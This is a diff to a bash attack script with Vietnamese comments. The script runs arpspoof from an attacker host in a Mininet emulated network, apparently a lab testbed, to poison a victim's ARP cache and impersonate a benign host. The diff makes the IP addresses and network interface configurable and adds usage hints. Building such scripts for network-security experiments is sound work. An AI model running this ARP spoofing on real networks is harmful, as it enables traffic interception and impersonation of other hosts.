@@ -5,24 +5,29 @@
 # Công cụ    : arpspoof
 # ==============================================================================
 
-VICTIM_IP="10.0.0.1"
+VICTIM_IP="${VICTIM_IP:-10.0.0.1}"
 
 # Khai báo địa chỉ IP hợp lệ (Benign Host) mà Attacker muốn mạo danh
-SPOOFED_IP="10.0.0.11" 
+SPOOFED_IP="${SPOOFED_IP:-10.0.0.11}"
 
 # Tự động trích xuất tên giao diện mạng ảo của Attacker trong Mininet
 # Logic: Tìm kiếm giao diện có định dạng h_atk[số]-eth0
-INTERFACE=$(ip link show | grep -o 'h_atk[0-9]\+-eth0' | head -n 1)
+if [ -z "$INTERFACE" ]; then
+    INTERFACE=$(ip link show | grep -o 'h_atk[0-9]\+-eth0' | head -n 1)
+fi
 
 # Kiểm tra tính hợp lệ của giao diện mạng trước khi thực thi
 if [ -z "$INTERFACE" ]; then
     echo "[!] Lỗi hệ thống: Không thể định vị giao diện mạng của Node tấn công."
+    echo "[!] Hãy chạy trong Mininet CLI, ví dụ: h_atk3 scripts/arp_spoofing.sh"
+    echo "[!] Hoặc truyền thủ công: INTERFACE=h_atk3-eth0 scripts/arp_spoofing.sh"
     exit 1
 fi
 
 echo "[*] Đã định vị giao diện mạng: $INTERFACE"
 echo "[*] Khởi chạy tiến trình đầu độc bộ nhớ cache ARP đối với Mục tiêu ($VICTIM_IP)..."
 echo "[*] Phân giải địa chỉ IP $SPOOFED_IP về địa chỉ MAC của Kẻ tấn công."
+echo "[*] Command: arpspoof -i \"$INTERFACE\" -t \"$VICTIM_IP\" \"$SPOOFED_IP\""
 echo "[*] Nhấn [Ctrl+C] để kết thúc tiến trình."
 
 # ------------------------------------------------------------------------------
